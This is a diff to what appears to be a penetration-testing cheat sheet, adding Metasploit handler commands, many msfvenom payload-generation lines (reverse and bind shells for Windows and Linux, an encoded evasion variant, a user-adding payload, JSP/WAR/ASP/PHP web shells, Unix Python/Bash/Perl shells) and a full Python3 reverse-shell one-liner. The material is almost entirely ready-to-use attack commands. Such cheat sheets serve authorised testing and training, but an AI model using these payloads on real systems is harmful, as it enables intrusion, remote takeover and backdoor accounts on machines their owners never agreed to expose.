@@ -17,6 +17,7 @@ Start a quiet Metasploit multi/handler for a Linux x64 meterpreter reverse TCP p
 
 ```sh
 msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; exploit -j"
+msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST <LHOST>; set LPORT <LPORT>; run"
 ```
 
 ## Metasploit Useful Modules
@@ -36,14 +37,45 @@ use auxiliary/scanner/portscan/tcp
 ## MSFvenom Payloads
 
 #Payloads
-Generate common reverse-shell payloads for Windows, Linux, JSP/WAR, and PHP.
+Generate common reverse-shell payloads for Windows, Linux, JSP/WAR, ASP/ASPX, PHP, and Unix command payloads.
 
 ```sh
+# Windows EXE / DLL / MSI.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/xor_dynamic -f exe -o shell_en.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
+msfvenom -p windows/adduser USER=<USER> PASS=<PASS> -f exe -o useradd.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o installer.msi
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o metershell.exe
+
+# Linux ELF.
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
+msfvenom -p linux/x64/shell_bind_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell_bind.elf
+
+# Web payloads.
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.jsp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f asp -o metershell.asp
 msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
-msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meter.exe
+
+# Unix command payloads.
+msfvenom -p cmd/unix/reverse_python LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.py
+msfvenom -p cmd/unix/reverse_bash LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.pl
+
+# Discovery helpers.
+msfvenom -l payloads
+msfvenom -p <PAYLOAD> --list-options
+```
+
+## Python Reverse Shell
+
+#Linux #Payloads
+Python3 reverse shell one-liner when Bash TCP is not reliable.
+
+```sh
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
 
 ## Windows Meterpreter Payloads
